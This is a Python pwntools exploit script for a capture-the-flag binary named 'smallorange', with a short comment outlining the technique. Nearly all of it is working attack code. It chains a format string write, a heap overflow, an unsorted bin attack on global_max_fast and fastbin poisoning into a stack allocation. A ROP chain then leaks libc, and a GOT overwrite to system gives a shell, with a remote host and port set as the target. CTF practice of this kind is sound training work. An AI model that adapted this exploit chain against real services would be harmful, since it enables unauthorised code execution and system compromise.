'''http://myhackerworld.top/2018/12/26/%E5%AE%89%E6%81%92%E6%9D%AF12%E6%9C%88%E6%9C%88%E8%B5%9B-pwn/
1. overwrite read nbytes to enable heap overflow
2. overwrite low 2 bytes of unsorted_bin chunk, then 1/16 percentage to modify global_max_fast to a large num, then following free chunk would go into fastbin
3. modify fd of chunk in fastbin to stack fake chunk, alloc_to_stack then modify return_addr to hijack control flow.
'''
from pwn import *
from FILE import *
context.log_level = 'debug'

elf = ELF('./smallorange')
write_plt = elf.symbols['write']
print 'write_plt= ' + hex(write_plt)
read_plt = elf.symbols['read']
print 'read_plt= ' + hex(read_plt)
write_got = elf.got['write']
print 'write_got= ' + hex(write_got)
read_got = elf.got['read']
print 'read_got= ' + hex(read_got)
atoi_got = elf.got['atoi']
print 'atoi_got= ' + hex(atoi_got)

def new(p, data):
	p.recvuntil('choice: ')
	p.sendline('1')
	p.recvuntil('text:\n')
	p.send(data)

def out(p, index):
	p.recvuntil('choice: ')
	p.sendline('2')
	p.recvuntil('index:\n')
	p.sendline(str(index))

def z(p, a=''):
	gdb.attach(p,a)
	if a == '':
		raw_input()
  
def max_fast():
  local = 1
  if local:
    #0x7ffffffde000     0x7ffffffff000 rw-p    21000 0      [stack]
    p = process(argv=['./smallorange','a'*0xe59]) #read(0, 0x7fffffffdab8, 0x23a0), 0x23a0 - (0xf000 - 0xdab8) = 0xe58
    #p=process(['./babyheap'],env={'LD_PRELOAD':'./libc.so.6'},aslr='FALSE')
    libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
  else:
    p = remote('120.132.85.170', 13579)
    libc = ELF('./libc-2.23.so')
  
  p.recvuntil('hahaha,come to hurt by ourselves\n')
  '''
  0x7ffd58b64340:	0x0000000000400cc8	0x00007ffd58b64380
  0x7ffd58b64350:	0x0000000000000000	0x0000002258b643c0
  0x7ffd58b64360:	0x00007ffd58b643c0	0x0000000000400977
  0x7ffd58b64370:	0x0000000000000000	0x00000000000000a0
  0x7ffd58b64380:	0x6161616161616161	0x6161616161616161
  0x7ffd58b64390:	0x6161616161616161	0x6161616161616161
  0x7ffd58b643a0:	0x6e24393125616161	0x00007ffd58b64379 #14 + 5
  '''
  p.send('a'*0x23+'%19$n') #overwrite v5 to 0x23A0
  p.recvuntil('a'*0x23)
  stack_v5_plus1 = u64(p.recv(6).ljust(8,'\0'))
  print 'stack_v5_plus1= ' + hex(stack_v5_plus1)
  
  p.recvuntil('heap addr:')
  data = p.recvuntil('\n', drop=True)
  heap_base = int(data, 16)
  print 'heap_base= ' + hex(heap_base)
  
  new(p, '0')
  new(p, '1')
  new(p, '2')
  new(p, '3')
  new(p, '4') # to avoid restore to top
  
  out(p, 0)
  out(p, 1)
  fake_max_fast = 'a'*0x100 + p64(0) + p64(0x111)
  fake_max_fast += p64(0) + '\xe8\x37'
  new(p, fake_max_fast) #5 = 0, overwrite chunk1
  new(p, '6') #invoke unsorted_bin_attack to overwrite global_max_fast
  
  out(p, 3)
  out(p, 2) #fastbin: 2->3
  pay = 'a'*0x100 + p64(0) + p64(0x111)
  '''
  0x400beb <getnum+62>     call   read@plt <0x400770>
        fd: 0x0
        buf: 0x7fffffffdae0
  0x7fffffffdae0:	0x0000000000400d18	0x00007ffff7a7c7fa
  0x7fffffffdaf0:	0x0000000000000000	0x3ab63949c6c45000
  0x7fffffffdb00:	0x00007fffffffdb20	0x0000000000400b06
  0x7fffffffdb10:	0x0000000000000000	0x3ab63949c6c45000
  0x7fffffffdb20:	0x00007fffffffdb80	0x00000000004009f9
  0x7fffffffdb30:	0x0000000000000000	0x00000002000023a0
  '''
  pay += p64(stack_v5_plus1 - 0x7fffffffdb39 + 0x7fffffffdae0 - 0x8) #fastbin: 2->3->getnum_buff
  new(p, pay) #7 = 2, overwrite chunk3
  new(p, '8') #8 = 3

  out(p, p64(0x111)) #fake 0x7fffffffdae0 to be 0x0000000000000111, atoi(0x7fffffffdae0) is 0, so would not exit
  
  
  '''
  RSP  0x7fffffffdb00, so return addr for read would be in 0x7fffffffdaf8, only need to overflow 0x10 to overwrite return addr.
  pwndbg> x/10gx 0x7fffffffdae8 - 0x10
  0x7fffffffdad8:	0x00007ffff7a91184	0x0000000000000111
  0x7fffffffdae8:	0x0000000000000000	0x00007fffffffdb20
  0x7fffffffdaf8:	0x0000000000400a85	0x00007fffffff0031
  0x400abb <new+76>     call   read@plt <0x400770>
        fd: 0x0
        buf: 0x7fffffffdae8
        nbytes: 0x23a0
  '''
  #0x0000000000400ca3 : pop rdi ; ret
  pop_rdi_ret = 0x0000000000400ca3
  #0x0000000000400ca1 : pop rsi ; pop r15 ; ret
  pop_rsi_pop_r15_ret = 0x0000000000400ca1
  pay = 'a' * 0x10 + p64(pop_rdi_ret) + p64(1) + p64(pop_rsi_pop_r15_ret) + p64(read_got) + p64(0) + p64(write_plt)
  getnum_addr = 0x4009AC
  pay += p64(pop_rdi_ret) + p64(0) + p64(pop_rsi_pop_r15_ret) + p64(atoi_got) + p64(0) + p64(read_plt) + p64(getnum_addr)
  z(p)
  new(p, pay)

  
  '''
  #if success would hijack to edit_addr, then use stack overflow and csu_init to leak puts_got, and overwrite atoi_got to system
  
  p.recvuntil("index:\n")
  p.sendline('0')
  
  pop_rbx_rbp_r12_r13_r14_r15 = 0x400C9A
  mov_mov_mov_call = 0x400C80
  pay = 'a'*8 + p64(pop_rbx_rbp_r12_r13_r14_r15)
  pay += p64(0) + p64(1) + p64(write_got) + p64(0x8) + p64(read_got) + p64(1) #write(1, read_got, 8)
  pay += p64(mov_mov_mov_call)
  pay += 'a'*8 + p64(0) + p64(1) + p64(read_got) + p64(0x8) + p64(atoi_got) + p64(0) #read(0, atoi_got, 8)
  getnum_addr = 0x4009AC
  pay += p64(mov_mov_mov_call) + 'a'*8*7 + p64(getnum_addr)
  p.send(pay)
  '''
  
  read_addr = u64(p.recv(8))
  print 'read_addr= ' + hex(read_addr)
  libc_base = read_addr - libc.symbols['read']
  print 'libc_base= ' + hex(libc_base)
  system_addr = libc_base + libc.symbols['system']
  
  p.send(p64(system_addr))
  p.recvuntil('choice: ')
  p.sendline('/bin/sh')
  p.interactive()

'''
while True:
  try:
    max_fast()
  except:
    pass
'''
max_fast()